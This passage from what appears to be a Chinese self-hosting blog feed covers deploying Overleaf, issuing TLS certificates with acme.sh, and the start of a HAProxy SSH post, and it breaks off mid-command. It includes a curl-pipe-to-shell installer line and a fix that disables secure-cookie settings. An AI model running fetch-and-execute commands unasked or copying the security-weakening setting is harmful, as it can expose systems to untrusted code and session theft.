            "content_html": "<p>部署了一个 overleaf 玩，目的需求是做一个共享文档，作为腾讯文档、知识库的替代品</p>\n<p>注册管理员账号的时候，出现了报错：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>alert</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Session error. Please check you have cookies enabled. If the problem persists, try clearing your cache and cookies.</span><br></pre></td></tr></table></figure></p>\n<p>查阅这个 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL292ZXJsZWFmL3Rvb2xraXQvaXNzdWVzLzE1MQ==\">issue</span> 后，得到了解决方案，将   <code>config/variables.env</code>  这里注释掉：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>variables.env</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">SHARELATEX_BEHIND_PROXY=<span class=\"literal\">true</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">SHARELATEX_SECURE_COOKIE=<span class=\"literal\">true</span></span></span><br></pre></td></tr></table></figure></p>\n<p>无论这里是  <code>true</code>  还是  <code>false</code>  都需要注释掉</p>\n<p>每次  <code>bin/up</code>  都会这样的结果：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsy@lsy:~/data/overleaf-toolkit$ bin/up</span><br><span class=\"line\">Initiating Mongo replica set...</span><br><span class=\"line\">WARN[0000] /home/lsy/data/overleaf-toolkit/lib/docker-compose.base.yml: `version` is obsolete</span><br><span class=\"line\">WARN[0000] /home/lsy/data/overleaf-toolkit/lib/docker-compose.vars.yml: `version` is obsolete</span><br><span class=\"line\">WARN[0000] /home/lsy/data/overleaf-toolkit/lib/docker-compose.redis.yml: `version` is obsolete</span><br><span class=\"line\">WARN[0000] /home/lsy/data/overleaf-toolkit/lib/docker-compose.mongo.yml: `version` is obsolete</span><br><span class=\"line\">WARN[0000] /home/lsy/data/overleaf-toolkit/lib/docker-compose.nginx.yml: `version` is obsolete</span><br><span class=\"line\">[+] Running 1/0</span><br><span class=\"line\"> ✔ Container mongo  Running                                                                                                               0.0s</span><br><span class=\"line\">WARN[0000] /home/lsy/data/overleaf-toolkit/lib/docker-compose.base.yml: `version` is obsolete</span><br><span class=\"line\">WARN[0000] /home/lsy/data/overleaf-toolkit/lib/docker-compose.vars.yml: `version` is obsolete</span><br><span class=\"line\">WARN[0000] /home/lsy/data/overleaf-toolkit/lib/docker-compose.redis.yml: `version` is obsolete</span><br><span class=\"line\">WARN[0000] /home/lsy/data/overleaf-toolkit/lib/docker-compose.mongo.yml: `version` is obsolete</span><br><span class=\"line\">WARN[0000] /home/lsy/data/overleaf-toolkit/lib/docker-compose.nginx.yml: `version` is obsolete</span><br><span class=\"line\">[+] Running 4/4</span><br><span class=\"line\"> ✔ Container mongo       Running                                                                                                          0.0s</span><br><span class=\"line\"> ✔ Container redis       Running                                                                                                          0.0s</span><br><span class=\"line\"> ✔ Container sharelatex  Recreated                                                                                                       60.5s</span><br><span class=\"line\"> ✔ Container nginx       Recreated                                                                                                        0.1s</span><br><span class=\"line\">Attaching to mongo, nginx, redis, sharelatex</span><br><span class=\"line\">sharelatex  | *** Running /etc/my_init.d/000_check_for_old_bind_mounts_5.sh...</span><br><span class=\"line\">sharelatex  | *** Running /etc/my_init.d/000_check_for_old_env_vars_5.sh...</span><br><span class=\"line\">sharelatex  | *** Running /etc/my_init.d/00_regen_ssh_host_keys.sh...</span><br><span class=\"line\">sharelatex  | *** Running /etc/my_init.d/100_generate_secrets.sh...</span><br><span class=\"line\">sharelatex  | generating random secrets</span><br><span class=\"line\">sharelatex  | *** Running /etc/my_init.d/100_make_overleaf_data_dirs.sh...</span><br><span class=\"line\"></span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure></p>\n<p>显然这个项目使用的是一个需要  <code>nohup</code>  的脚本。</p>\n<p>使用这样的脚本模版方便管理：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.</span><br><span class=\"line\">├── running.log</span><br><span class=\"line\">├── running.pid</span><br><span class=\"line\">├── start.sh</span><br><span class=\"line\">└── stop.sh</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight shell\"><figcaption><span>start.sh :</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">run=bin/up # 启动脚本的指令</span><br><span class=\"line\">DIR=&quot;$( cd &quot;$( dirname &quot;$0&quot;  )&quot; &amp;&amp; pwd  )&quot;</span><br><span class=\"line\">export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$DIR/lib</span><br><span class=\"line\">nohup $DIR/$run &gt; $DIR/running.log 2&gt;&amp;1&amp; echo $! &gt; $DIR/running.pid</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight shell\"><figcaption><span>stop.sh :</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">kill `cat running.pid`</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>使用 logrotate 定期清理日志。在  <code>/etc/logrotate.conf</code>  配置文件中增加：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>/etc/logrotate.conf</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">/home/lsy/data/overleaf-toolkit/running.log &#123;</span><br><span class=\"line\">        size 1k</span><br><span class=\"line\">        create 700 lsy lsy</span><br><span class=\"line\">        rotate 4</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>当然这里  <code>/home/lsy/data/overleaf-toolkit/</code>  换成自己对应的  <code>running.log</code>  存放的目录</p>\n<p>重新加载 logrotate 的配置文件：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">sudo logrotate /etc/logrotate.conf</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>后续出现的问题</p>\n<p>没办法使用 markdown 插件，不符合需求，转而寻找支持 typst 、 markdown 的更紧跟时代潮流的方案</p>\n<div class=\"note primary\">\n<p>进度：没找了，没自建这样东西的需求了，真有需求再说吧</p>\n</div>\n<script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kity@2.0.4/dist/kity.min.js\"></script><script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js\"></script><script defer=\"true\" type=\"text&#x2F;javascript\" src=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js\"></script><link rel=\"stylesheet\" type=\"text&#x2F;css\" href=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css\">",
            "tags": [
                "计算机科学",
                "DevOps",
                "DevOps"
            ]
        },
        {
            "id": "https://taf.fyi/cs/devops/acme/",
            "url": "https://taf.fyi/cs/devops/acme/",
            "title": "acme.sh插件",
            "date_published": "2024-04-16T16:00:00.000Z",
            "content_html": "<h1 id=\"证书相关文件格式\"><a class=\"anchor\" href=\"#证书相关文件格式\">#</a> 证书相关文件格式</h1>\n<ul>\n<li>证书 (Certificate) -  <code>.cer</code>  、  <code>.crt</code></li>\n<li>私钥 (Private Key) -  <code>.key</code></li>\n<li>证书签名请求 (Certificate signing request) -  <code>.csr</code></li>\n<li>证书吊销列表 (Certificate Revocation List) -  <code>.crl</code></li>\n</ul>\n<p>以上除了  <code>.crl</code>  均可以使用这两种编码方式，从而有这样的后缀：</p>\n<ul>\n<li>base64 编码 -  <code>.pem</code></li>\n<li>二进制编码 (少见) -  <code>.der</code></li>\n</ul>\n<p>为了给我们的网页应用使用 https 协议，我们需要得到<mark>有效的第三方认证</mark>的<mark>证书</mark>以及对应的<mark>私钥</mark>。</p>\n<p>CA，certificate authority。证书局，用于制作、认证证书的第三方机构</p>\n<h1 id=\"安装\"><a class=\"anchor\" href=\"#安装\">#</a> 安装</h1>\n<p>安装 <span class=\"exturl\" data-url=\"aHR0cDovL2FjbWUuc2g=\">acme.sh</span> ：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FjbWVzaC1vZmZpY2lhbC9hY21lLnNo\">https://github.com/acmesh-official/acme.sh</span></p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl https://get.acme.sh | sh -s email=username@example.com</span><br></pre></td></tr></table></figure></p>\n<p>但是需要🪜，所以国内等效的做法是：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone --depth 1 https://github.com/acmesh-official/acme.sh.git</span><br><span class=\"line\">cd acme.sh</span><br><span class=\"line\">./acme.sh --install -m username@example.com</span><br></pre></td></tr></table></figure></p>\n<div class=\"note information\">\n<p>替换  <code>username@example.com</code>  为自己的邮箱，用来接收上游证书的邮件通知</p>\n</div>\n<p>目前探索了三种方法，最推荐第三种方法，直接接入运营商的 API ，需要 issue 时只需要一行指令实现，非常方便。</p>\n<h1 id=\"方法一\"><a class=\"anchor\" href=\"#方法一\">#</a> 方法一</h1>\n<p>请求注册，并将返回结果写到  <code>acme-dns.challenges</code></p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -s -X POST https://auth.acme-dns.io/register | python3 -m json.tool &gt; acme-dns.challenges;cat acme-dns.challenges</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"/assets/cs/devops/acme/acme-dns%E6%B3%A8%E5%86%8C%E7%94%A8%E6%88%B7.png\" alt=\"acme-dns注册用户\" /></p>\n<p>导出用户名、密码、子域名等结果</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export ACMEDNS_USERNAME=&quot;$(cat acme-dns.challenges | awk -F&quot;\\&quot;&quot; &#x27;/username/&#123;print $4&#125;&#x27;)&quot;</span><br><span class=\"line\">export ACMEDNS_PASSWORD=&quot;$(cat acme-dns.challenges | awk -F&quot;\\&quot;&quot; &#x27;/password/&#123;print $4&#125;&#x27;)&quot;</span><br><span class=\"line\">export ACMEDNS_SUBDOMAIN=&quot;$(cat acme-dns.challenges | awk -F&quot;\\&quot;&quot; &#x27;/subdomain/&#123;print $4&#125;&#x27;)&quot;</span><br><span class=\"line\">echo &quot;FULLDOMAIN = $(cat acme-dns.challenges | awk -F&quot;\\&quot;&quot; &#x27;/fulldomain/&#123;print $4&#125;&#x27;)&quot;</span><br></pre></td></tr></table></figure></p>\n<p>同时增加 cname 记录来完成挑战：</p>\n<p><img data-src=\"/assets/cs/devops/acme/cname.png\" alt=\"cname\" /></p>\n<p>申请 ssl 证书：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">~/.acme.sh/acme.sh --issue --dns dns_acmedns -d vm.fuusen.space --dnssleep 300</span><br></pre></td></tr></table></figure></p>\n<p>结果：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@proxmox:~# ~/.acme.sh/acme.sh --issue --dns dns_acmedns -d vm.fuusen.space --dnssleep 300</span><br><span class=\"line\">[Sun Mar 10 12:19:48 PM CST 2024] Using CA: https://acme-v02.api.letsencrypt.org/directory</span><br><span class=\"line\">[Sun Mar 10 12:19:48 PM CST 2024] Creating domain key</span><br><span class=\"line\">[Sun Mar 10 12:19:48 PM CST 2024] The domain key is here: /root/.acme.sh/vm.fuusen.space_ecc/vm.fuusen.space.key</span><br><span class=\"line\">[Sun Mar 10 12:19:48 PM CST 2024] Single domain=&#x27;vm.fuusen.space&#x27;</span><br><span class=\"line\">[Sun Mar 10 12:19:51 PM CST 2024] Getting webroot for domain=&#x27;vm.fuusen.space&#x27;</span><br><span class=\"line\">[Sun Mar 10 12:19:51 PM CST 2024] Adding txt value: JE6AGlpWVR5S192edUoStf3_OXAG9UR_cwnKIGGIL9U for domain:  _acme-challenge.vm.fuusen.space</span><br><span class=\"line\">[Sun Mar 10 12:19:51 PM CST 2024] Using acme-dns</span><br><span class=\"line\">[Sun Mar 10 12:19:52 PM CST 2024] The txt record is added: Success.</span><br><span class=\"line\">[Sun Mar 10 12:19:52 PM CST 2024] Sleep 300 seconds for the txt records to take effect</span><br><span class=\"line\">[Sun Mar 10 12:24:53 PM CST 2024] Verifying: vm.fuusen.space</span><br><span class=\"line\">[Sun Mar 10 12:24:54 PM CST 2024] Pending, The CA is processing your order, please just wait. (1/30)</span><br><span class=\"line\">[Sun Mar 10 12:24:58 PM CST 2024] Success</span><br><span class=\"line\">[Sun Mar 10 12:24:58 PM CST 2024] Removing DNS records.</span><br><span class=\"line\">[Sun Mar 10 12:24:58 PM CST 2024] Removing txt: JE6AGlpWVR5S192edUoStf3_OXAG9UR_cwnKIGGIL9U for domain: _acme-challenge.vm.fuusen.space</span><br><span class=\"line\">[Sun Mar 10 12:24:58 PM CST 2024] Using acme-dns</span><br><span class=\"line\">[Sun Mar 10 12:24:58 PM CST 2024] Removed: Success</span><br><span class=\"line\">[Sun Mar 10 12:24:58 PM CST 2024] Verify finished, start to sign.</span><br><span class=\"line\">[Sun Mar 10 12:24:58 PM CST 2024] Lets finalize the order.</span><br><span class=\"line\">[Sun Mar 10 12:24:58 PM CST 2024] Le_OrderFinalize=&#x27;https://acme-v02.api.letsencrypt.org/acme/finalize/1610913557/251061640687&#x27;</span><br><span class=\"line\">[Sun Mar 10 12:24:59 PM CST 2024] Downloading cert.</span><br><span class=\"line\">[Sun Mar 10 12:24:59 PM CST 2024] Le_LinkCert=&#x27;https://acme-v02.api.letsencrypt.org/acme/cert/03567f6bc53bd6e36d65f5b8f094bfb91eaa&#x27;</span><br><span class=\"line\">[Sun Mar 10 12:25:00 PM CST 2024] Cert success.</span><br><span class=\"line\">-----BEGIN CERTIFICATE-----</span><br><span class=\"line\">MIIEHzCCAwegAwIBAgISA1Z/a8U71uNtZfW48JS/uR6qMA0GCSqGSIb3DQEBCwUA</span><br><span class=\"line\">MDIxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBFbmNyeXB0MQswCQYDVQQD</span><br><span class=\"line\">EwJSMzAeFw0yNDAzMTAwMzI0NTlaFw0yNDA2MDgwMzI0NThaMBoxGDAWBgNVBAMT</span><br><span class=\"line\">D3ZtLmZ1dXNlbi5zcGFjZTBZMBMGByqGSM49AgEGCCqGSM49AwEHA0IABEbT5BcQ</span><br><span class=\"line\">x14Rc9EqGps5dTQ9Jl5ywvrWAVJmQFtmbIBAileSa+/KYuYeSmjuDAyjj99to2KM</span><br><span class=\"line\">R9fVK6j4fYDycCOjggIQMIICDDAOBgNVHQ8BAf8EBAMCB4AwHQYDVR0lBBYwFAYI</span><br><span class=\"line\">KwYBBQUHAwEGCCsGAQUFBwMCMAwGA1UdEwEB/wQCMAAwHQYDVR0OBBYEFBo67Zs5</span><br><span class=\"line\">olZHLkCkGTQK/ZFVQJwvMB8GA1UdIwQYMBaAFBQusxe3WFbLrlAJQOYfr52LFMLG</span><br><span class=\"line\">MFUGCCsGAQUFBwEBBEkwRzAhBggrBgEFBQcwAYYVaHR0cDovL3IzLm8ubGVuY3Iu</span><br><span class=\"line\">b3JnMCIGCCsGAQUFBzAChhZodHRwOi8vcjMuaS5sZW5jci5vcmcvMBoGA1UdEQQT</span><br><span class=\"line\">MBGCD3ZtLmZ1dXNlbi5zcGFjZTATBgNVHSAEDDAKMAgGBmeBDAECATCCAQMGCisG</span><br><span class=\"line\">AQQB1nkCBAIEgfQEgfEA7wB1ADtTd3U+LbmAToswWwb+QDtn2E/D9Me9AA0tcm/h</span><br><span class=\"line\">+tQXAAABjiabW4kAAAQDAEYwRAIgehF+9/VI/MC8IvkLbFTpa82IP1zXOpZFvW1U</span><br><span class=\"line\">D77cdCYCIAy+z2hwinQtpc4up40bhNx4+h1JujS7DDgyNwsfdGaCAHYA7s3QZNXb</span><br><span class=\"line\">Gs7FXLedtM0TojKHRny87N7DUUhZRnEftZsAAAGOJptbiQAABAMARzBFAiAy8u5B</span><br><span class=\"line\">ZN0V23ZzMJ1dViQ4bfXWJyxs42W93GIpmJRkPAIhAOfoZmJpDW02uZV667vTZWqF</span><br><span class=\"line\">zmGJfM3njf+XQnnARF3dMA0GCSqGSIb3DQEBCwUAA4IBAQAxiO0OOA/tVqDfoQne</span><br><span class=\"line\">JrlX1wB+aYmTHeqwfxBE+Q0Mu0irGtX9K4XyhQR06edLKw1fXY2dH+iYKvscsE91</span><br><span class=\"line\">iGhs0nSrAqKIi3VLLgvEFrTEW7C8Pftgt4Hbx89LvION7MgXXHe62L4JvrTkQ/Y4</span><br><span class=\"line\">sRa6vt48bDkDspQ1BQrT589SiXMUsNOE947mbaViR3cbg2oQd+XxLJaAb1ZoSNd0</span><br><span class=\"line\">Lvs/j5u67r30C5QnSEGxChR/6c9V9+aw07yttoD6M8iA7LA736pPjWAM8hvQ+cQa</span><br><span class=\"line\">wAWyDU1Ub89KJx5Pv+nvbNCRT1TjoqmhPxYSxsDTYAjUTV9sBbxvcUdG7w+6tUwX</span><br><span class=\"line\">6b9m</span><br><span class=\"line\">-----END CERTIFICATE-----</span><br><span class=\"line\">[Sun Mar 10 12:25:00 PM CST 2024] Your cert is in: /root/.acme.sh/vm.fuusen.space_ecc/vm.fuusen.space.cer</span><br><span class=\"line\">[Sun Mar 10 12:25:00 PM CST 2024] Your cert key is in: /root/.acme.sh/vm.fuusen.space_ecc/vm.fuusen.space.key</span><br><span class=\"line\">[Sun Mar 10 12:25:00 PM CST 2024] The intermediate CA cert is in: /root/.acme.sh/vm.fuusen.space_ecc/ca.cer</span><br><span class=\"line\">[Sun Mar 10 12:25:00 PM CST 2024] And the full chain certs is there: /root/.acme.sh/vm.fuusen.space_ecc/fullchain.cer</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"方法二\"><a class=\"anchor\" href=\"#方法二\">#</a> 方法二</h1>\n<p>推荐使用 Let's Encrypt 作为上游 CA ：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">acme.sh --set-default-ca --server letsencrypt</span><br></pre></td></tr></table></figure></p>\n<p>使用 Nginx ，在  <code>/etc/nginx/conf.d/</code>  中新建一个配置文件  <code>letsencrypt.conf</code>  （名字随意），内容如下：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>letsencrypt.conf</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">\tlisten 80;</span><br><span class=\"line\">\tlisten [::]:80;</span><br><span class=\"line\">\tserver_name example1.com;</span><br><span class=\"line\">\tserver_name example2.com;</span><br><span class=\"line\"></span><br><span class=\"line\">\tlocation /.well-known/acme-challenge &#123;</span><br><span class=\"line\">\t\troot /var/www/letsencrypt;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tlocation / &#123;</span><br><span class=\"line\">\t\trewrite\t^/(.*)$ https://$host/$1 permanent;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>运行：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">acme.sh --issue -d md.fuusen.space -d tex.fuusen.space -w /var/www/letsencrypt --debug</span><br></pre></td></tr></table></figure></p>\n<p>reference:</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly91LnNiL2FjbWUtc2gtc3NsLw==\">https://u.sb/acme-sh-ssl/</span></li>\n</ul>\n<h1 id=\"方法三\"><a class=\"anchor\" href=\"#方法三\">#</a> 方法三</h1>\n<p>用运营商的 API ，自动添加 txt 记录完成挑战。参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FjbWVzaC1vZmZpY2lhbC9hY21lLnNoL3dpa2kvZG5zYXBpMg==\">https://github.com/acmesh-official/acme.sh/wiki/dnsapi2</span></p>\n<p>首先第一次需要设置 API ，具体需要看不同的运营商。</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export ...=...</span><br></pre></td></tr></table></figure></p>\n<p>然后 issue 之后会自动保存所设置的 API 。</p>\n<p>执行指令：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">acme.sh --issue --dns [dns_your_server] -d example.com</span><br></pre></td></tr></table></figure></p>\n<p>似乎也可以一次性批量 issue 多个 cert ，但是我实际测试却只得到了同时 issue 时的第一个域名的证书，可能是还存在 bug 。</p>\n<p>这样方法得到的证书文件在  <code>~/.acme.sh/example.com_ecc/</code>  如下：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">├── ca.cer</span><br><span class=\"line\">├── fullchain.cer</span><br><span class=\"line\">├── example.com.cer</span><br><span class=\"line\">├── example.com.conf</span><br><span class=\"line\">├── example.com.csr</span><br><span class=\"line\">├── example.com.csr.conf</span><br><span class=\"line\">└── example.com.key</span><br></pre></td></tr></table></figure></p>\n<p>其中：</p>\n<ul>\n<li><code>fullchain.cer</code>  是对应的<mark>证书文件</mark></li>\n<li><code>example.com.key</code>  是对应的<mark>密钥文件</mark></li>\n</ul>\n<p>Nginx 配置：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>xxx.conf</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">\t\t......</span><br><span class=\"line\">\t\tssl_certificate  /home/lsy/.acme.sh/example.com_ecc/fullchain.cer;</span><br><span class=\"line\">        ssl_certificate_key  /home/lsy/.acme.sh/example.com_ecc/example.com.key;</span><br><span class=\"line\">        ......</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>⚠️ 注意如果  <code>curl</code>  网页时出现如下报错：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl: (35) OpenSSL/3.0.13: error:0A00010B:SSL routines::wrong version number</span><br></pre></td></tr></table></figure></p>\n<p>说明 http /https 的协议配置有问题，出现了本来该用 https 却用了 http ，或反之的情况。</p>\n<script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kity@2.0.4/dist/kity.min.js\"></script><script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js\"></script><script defer=\"true\" type=\"text&#x2F;javascript\" src=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js\"></script><link rel=\"stylesheet\" type=\"text&#x2F;css\" href=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css\">",
            "tags": [
                "计算机科学",
                "DevOps",
                "DevOps"
            ]
        },
        {
            "id": "https://taf.fyi/cs/pve/haproxy-ssh/",
            "url": "https://taf.fyi/cs/pve/haproxy-ssh/",
            "title": "HAProxy代理SSH",
            "date_published": "2024-03-11T16:00:00.000Z",
            "content_html": "<h1 id=\"宿主与虚拟机之间的网络问题\"><a class=\"anchor\" href=\"#宿主与虚拟机之间的网络问题\">#</a> 宿主与虚拟机之间的网络问题</h1>\n<p>我们的两台宿主居然都 ping 不到虚拟机，导致后续 haproxy 代理转发后出现所有虚拟机 server 都是 <code>down</code>  状态</p>\n<p>原因应该是宿主只有一个校园网网段的 ip，但是虚拟机只有实验室局域网网段的 ip</p>\n<p>这个问题需要配置宿主节点的网络，可以在 PVE 控制面板修改 网络 / Network：</p>\n<p><img data-src=\"/assets/cs/pve/haproxy-ssh/network.png\" alt=\"network\" /></p>\n<p>实际上就是编辑该节点的：  <code>/etc/network/interfaces</code>  配置文件</p>\n<p>应该需要配置虚拟网卡才能解决，但是我们的一台服务器有两张网卡（图中 eno1 eno2） 所以我们最后的解决方案给服务器插了多一条网线，配置该网卡 ip 为实验室局域网的 ip，从而该服务器连接上了虚拟机</p>\n<h1 id=\"安装-haproxy\"><a class=\"anchor\" href=\"#安装-haproxy\">#</a> 安装 HAProxy</h1>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt isntall 